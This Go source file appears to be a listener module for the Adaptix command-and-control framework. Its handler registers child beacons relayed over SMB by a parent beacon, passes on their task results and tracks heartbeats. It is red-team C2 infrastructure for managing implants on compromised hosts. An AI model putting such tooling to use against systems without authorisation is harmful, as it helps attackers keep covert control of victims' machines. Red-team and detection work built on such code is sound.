package main

import "fmt"

// smbInternalHandler is the core of the SMB listener.
// It is called by Adaptix whenever a parent beacon relays child data to this listener.
//
// Wire format: [36B child UUID][payload]
//   - payload non-empty + UUID unknown  → register new child (checkin)
//   - payload non-empty + UUID known    → process task results
//   - payload empty    + UUID known     → heartbeat tick only
func smbInternalHandler(l *SMBListener, data []byte) (int64, error) {
	if len(data) < 36 {
		return 0, fmt.Errorf("[Pain SMB] InternalHandler: data too short (%d bytes)", len(data))
	}

	uid     := data[:36]
	payload := data[36:]

	agentId, exists := ModuleObject.ts.TsAgentIdByUID(uid)

	if !exists {
		if len(payload) == 0 {
			return 0, fmt.Errorf("[Pain SMB] unknown child %s with empty payload - ignoring", string(uid))
		}
		agentData, err := ModuleObject.ts.TsAgentCreate(
			"deadbeef", uid, payload, l.Name, "SMB", true,
		)
		if err != nil {
			// Race: another goroutine may have registered it between our check and create
			if retryId, found := ModuleObject.ts.TsAgentIdByUID(uid); found {
				agentId = retryId
			} else {
				return 0, fmt.Errorf("[Pain SMB] TsAgentCreate failed: %w", err)
			}
		} else {
			agentId = agentData.Id
			fmt.Printf("[Pain SMB] registered child %s via listener %s (id=%d)\n",
				string(uid), l.Name, agentId)
		}
	} else if len(payload) > 0 {
		_ = ModuleObject.ts.TsAgentProcessData(agentId, payload)
	}

	_ = ModuleObject.ts.TsAgentSetTick(agentId, l.Name)
	return agentId, nil
}
